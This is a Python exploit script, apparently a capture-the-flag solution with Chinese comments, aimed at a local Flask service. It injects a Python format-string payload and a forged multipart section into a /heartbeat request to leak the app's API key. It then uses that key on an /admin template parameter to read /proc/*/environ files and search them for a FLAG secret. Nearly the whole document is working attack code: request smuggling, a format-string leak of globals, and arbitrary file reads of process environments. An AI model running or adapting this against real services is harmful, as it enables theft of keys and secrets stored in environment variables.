import httpx
import socket

TARGET = "http://127.0.0.1:5000"
BOUNDARY = "---------------------------FlagBoundary123"

def get_api_key():
    fmt_payload = "{0.view_functions[action].__globals__[API_KEY]}"
    fake_action_part = (
        f'\r\n--{BOUNDARY}\r\n'
        f'Content-Disposition: form-data; name="action"; filename="action"\r\n'
        f'Content-Type: text/json\r\n\r\n'
        f'{{"type": "debug"}}\r\n'
    )
    text = fmt_payload + fake_action_part
    params = {'text': text, 'client': 'Content-Type', 'token': f'multipart/form-data; boundary={BOUNDARY}'}
    r = httpx.post(f'{TARGET}/heartbeat', data=params, timeout=10.0)
    return r.text.strip()

def read_file_via_admin(api_key, path):
    headers = {"Authorization": api_key}
    try:
        r = httpx.get(f"{TARGET}/admin", params={"tmpl": path}, headers=headers, timeout=30.0)
        return r.text, r.status_code
    except Exception as e:
        return str(e), 0

if __name__ == "__main__":
    api_key = get_api_key()
    print(f"[+] API_KEY: {api_key}")
    
    # /proc/1/environ 包含 FLAG，但 render_template_string 会失败
    # 因为 flag 值本身可能包含特殊字符
    
    # 让我们检查其他 PID
    print("\n[*] Checking various /proc/*/environ...")
    for pid in [1, 16, 17, 18, 19, 20]:
        content, code = read_file_via_admin(api_key, f"/proc/{pid}/environ")
        print(f"PID {pid}: status={code}")
        if code == 200:
            # 成功读取，检查是否有 FLAG
            if 'FLAG' in content:
                print(f"[!] FLAG found in PID {pid}!")
                print(content)
    
    # 关键发现：/proc/1/environ 返回 500
    # 这意味着 Jinja2 尝试渲染时出错
    # 错误可能是因为：
    # 1. 二进制数据（\x00）
    # 2. FLAG 值包含 {{ }} 等 Jinja2 特殊语法
    # 3. 其他模板语法错误
    
    # 让我检查 /proc/self/environ（Python 进程）
    print("\n[*] Checking /proc/self/environ...")
    content, code = read_file_via_admin(api_key, "/proc/self/environ")
    print(f"Status: {code}")
    if code == 200:
        # 解析 null 分隔的环境变量
        for kv in content.split('\x00'):
            if 'FLAG' in kv.upper():
                print(f"[!] {kv}")
    
    # 方法：读取 /proc/1/environ 的原始字节
    # 但 render_template_string 会先处理...
    
    # 另一个想法：/proc/1/task/1/environ
    print("\n[*] Checking /proc/1/task/1/environ...")
    content, code = read_file_via_admin(api_key, "/proc/1/task/1/environ")
    print(f"Status: {code}")
